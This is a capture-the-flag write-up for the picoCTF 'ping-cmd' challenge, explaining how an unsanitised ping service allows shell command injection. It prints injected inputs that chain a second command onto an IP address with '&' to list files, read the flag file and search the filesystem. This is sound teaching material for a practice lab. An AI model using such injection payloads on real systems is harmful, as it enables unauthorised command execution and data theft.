# ping-cmd

**Link**: https://play.picoctf.org/practice/challenge/759

**Difficulty**: easy

## Description

Can you make the server reveal its secrets? It seems to be able to ping Google DNS,
but what happens if you get a little creative with your input?

## Resources

None — everything happens over the network.

## How to solve

Connect to the service:

    nc mysterious-sea.picoctf.net PORT

It prompts:

    Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):

Sending `8.8.8.8` runs a normal ping:

    PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.52 ms
    ...

**The vulnerability:** the server takes your input and drops it straight into a
shell command (something like `ping <input>`) with no sanitisation. We can chain a
second command with a shell metacharacter (`&`, `;`, `|`, `&&`). The `&` lets our
extra command run regardless of the ping.

Enumerate the working directory first:

    8.8.8.8 & ls

Then read the flag file it reveals:

    8.8.8.8 & cat flag.txt

The command output (including the flag) is echoed back over the connection.

> If `flag.txt` isn't in the current directory, search for it:
> `8.8.8.8 & find / -name 'flag*' 2>/dev/null` then `cat` the path.

## Flag

    picoCTF{...}   (printed by `cat flag.txt` on your instance)
